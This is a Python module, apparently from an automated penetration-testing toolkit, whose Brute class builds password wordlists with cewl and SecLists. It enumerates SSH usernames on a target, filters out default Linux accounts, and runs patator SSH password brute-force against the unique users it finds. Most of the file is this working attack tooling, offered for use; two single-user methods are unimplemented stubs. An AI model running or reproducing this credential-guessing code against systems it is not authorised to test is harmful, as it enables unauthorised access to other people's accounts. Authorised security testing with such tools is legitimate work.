#!/usr/bin/env python3

import os
from subprocess import call
from sty import fg, bg, ef, rs
import json
from lib import nmapParser

# from lib import searchsploits


class Brute:
    def __init__(self, target, serviceName, port):
        self.target = target
        self.serviceName = serviceName
        self.port = port
        self.unique_users = []

    def CewlWordlist(self):
        cwd = os.getcwd()
        reportDir = f"{cwd}/{self.target}-Report"
        if os.path.exists(f"{reportDir}/aquatone/urls.txt"):
            if not os.path.exists(f"{reportDir}/wordlists"):
                os.makedirs(f"{reportDir}/wordlists")
            url_list = []
            try:
                urls_file = f"{reportDir}/aquatone/urls.txt"
                with open(urls_file, "r") as uf:
                    for line in uf:
                        if "index.html" in line:
                            url_list.append(line.rstrip())
                        if "index.php" in line:
                            url_list.append(line.rstrip())
                wordlist = sorted(set(url_list))
            except FileNotFoundError as fnf_error:
                print(fnf_error)
                exit()
            # print(wordlist)
            cewl_cmds = []
            if len(wordlist) != 0:
                counter = 0
                for url in wordlist:
                    counter += 1
                    cewl_cmds.append(
                        f"cewl {url} -m 3 -w {reportDir}/wordlists/cewl-{counter}-list.txt"
                    )
            if len(cewl_cmds) != 0:
                for cmd in cewl_cmds:
                    call(cmd, shell=True)
            words = []
            try:
                with open("/usr/share/seclists/Passwords/probable-v2-top1575.txt", "r") as prob:
                    for line in prob:
                        words.append(line.rstrip())
                for wl in os.listdir(f"{reportDir}/wordlists"):
                    wlfile = f"{reportDir}/wordlists/{wl}"
                    with open(wlfile, "r") as wlf:
                        for line in wlf:
                            words.append(line.rstrip())
                        with open(f"{reportDir}/wordlists/all.txt", "a") as allwls:
                            string_words = "\n".join(map(str, words))
                            allwls.write(str(string_words))
            except FileNotFoundError as fnf_error:
                print(fnf_error)

    def SshUsersBrute(self):
        cmd_info = "[" + fg.green + "+" + fg.rs + "]"
        green = fg.li_green
        teal = fg.li_cyan
        reset = fg.rs
        cwd = os.getcwd()
        self.CewlWordlist()
        reportDir = f"{cwd}/{self.target}-Report"
        if not os.path.exists(f"{reportDir}/ssh"):
            os.makedirs(f"{reportDir}/ssh")
        # print(f"Target:{self.target} serviceName:{self.serviceName} port:{self.port}")
        default_linux_users = [
            "root",
            "adm",
            "nobody",
            "mysql",
            "daemon",
            "bin",
            "games",
            "sync",
            "lp",
            "mail",
            "sshd",
            "ftp",
            "man",
            "sys",
            "news",
            "uucp",
            "proxy",
            "list",
            "backup",
            "www-data",
            "irc",
            "gnats",
            "systemd-timesync",
            "systemd",
            "systemd-network",
            "systemd-resolve",
            "systemd-bus-proxy",
            "_apt",
            "apt",
            "messagebus",
            "mysqld",
            "ntp",
            "arpwatch",
            "Debian-exim",
            "uuid",
            "uuidd",
            "dnsmasq",
            "postgres",
            "usbmux",
            "rtkit",
            "stunnel4",
            "Debian-snmp",
            "sslh",
            "pulse",
            "avahi",
            "saned",
            "inetsim",
            "colord",
            "_rpc",
            "statd",
            "shutdown",
            "halt",
            "operator",
            "gopher",
            "rpm",
            "dbus",
            "rpc",
            "postfix",
            "mailman",
            "named",
            "exim",
            "rpcuser",
            "ftpuser",
            "nfsnobody",
            "xfs",
            "gdm",
            "htt",
            "webalizer",
            "mailnull",
            "smmsp",
            "squid",
            "netdump",
            "pcap",
            "radiusd",
            "radvd",
            "quagga",
            "wnn",
            "dovecot",
            "avahi-autoipd",
            "libuid",
            "hplip",
            "statd",
            "bind",
            "haldaemon",
            "vcsa",
            "abrt",
            "saslauth",
            "apache",
            "nginx",
            "tcpdump",
            "memcached",
            "liquidsoap",
            "dhcpd",
            "clamav",
            "lxc-dnsmasq",
            "xrdp",
            "speech-dispatcher",
            "kernoops",
            "whoopsie",
            "lightdm",
            "syslog",
        ]
        cmd = f"python {cwd}/scripts/ssh_user_enum.py --port {self.port} --userList wordlists/usernames.txt {self.target} --outputFile {reportDir}/ssh/ssh-usernames.json --outputFormat json"
        print(cmd_info, cmd)
        print("This may take a few minutes.")
        try:
            call(cmd, shell=True)
        except ConnectionRefusedError as cre_error:
            print(cre_error)
            exit()
        try:
            with open(f"{reportDir}/ssh/ssh-usernames.json") as json_file:
                data = json.load(json_file)
                num_valid_users = len(data["Valid"])
                # print(f"Number of valid users: {num_valid_users}")
                if num_valid_users < 55:
                    for valid in data["Valid"]:
                        if valid not in default_linux_users:
                            print(
                                f"{cmd_info} {teal}Unique User Found!{reset} {green}{valid}{reset}"
                            )
                            self.unique_users.append(valid)
                        else:
                            print(f"{cmd_info} " + valid)

                else:
                    print(f"OpenSSH returned too many false positives: {num_valid_users}")
        except FileNotFoundError as fnf_error:
            print(fnf_error)
            exit()

        if len(self.unique_users) > 0 and (len(self.unique_users) < 4):
            if os.path.exists(f"{reportDir}/wordlists/all.txt"):
                cewl_wordlist = f"{reportDir}/wordlists/all.txt"
                if os.path.getsize(cewl_wordlist) > 0:
                    for u in self.unique_users:
                        print(
                            f"{teal}Beginning Password Brute Force for User:{reset} {green}{u}{reset}"
                        )
                        patator_cmd = f"""patator ssh_login host={self.target} port={self.port} user={u} password=FILE0 0={cewl_wordlist} persistent=0 -x ignore:mesg='Authentication failed.'"""
                        print(f"{cmd_info} {patator_cmd}")
                        call(patator_cmd, shell=True)
            else:
                for u in self.unique_users:
                    print(
                        f"{teal}Beginning Password Brute Force for User:{reset} {green}{u}{reset}"
                    )
                    patator_cmd = f"""patator ssh_login host={self.target} port={self.port} user={u} password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed.'"""
                    print(f"{cmd_info} {patator_cmd}")
                    call(patator_cmd, shell=True)


class BruteSingleUser:
    def __init__(self, target, serviceName, port, user):
        self.target = target
        self.serviceName = serviceName
        self.port = port
        self.user = user

    def SshSingleUserBrute(self):
        # cwd = os.getcwd()
        # reportDir = f"{cwd}/{self.target}-Report"
        print("Not yet implimented")
        print(
            f"Target:{self.target} serviceName:{self.serviceName} port:{self.port} user:{self.user}"
        )


class BruteSingleUserCustom:
    def __init__(self, target, serviceName, port, user, passList):
        self.target = target
        self.serviceName = serviceName
        self.port = port
        self.user = user
        self.passList = passList

    def SshSingleUserBruteCustom(self):
        # cwd = os.getcwd()
        # reportDir = f"{cwd}/{self.target}-Report"
        print("Not yet implimented")
        print(
            f"Target:{self.target} serviceName:{self.serviceName} port:{self.port} user:{self.user} password list: {self.passList}"
        )
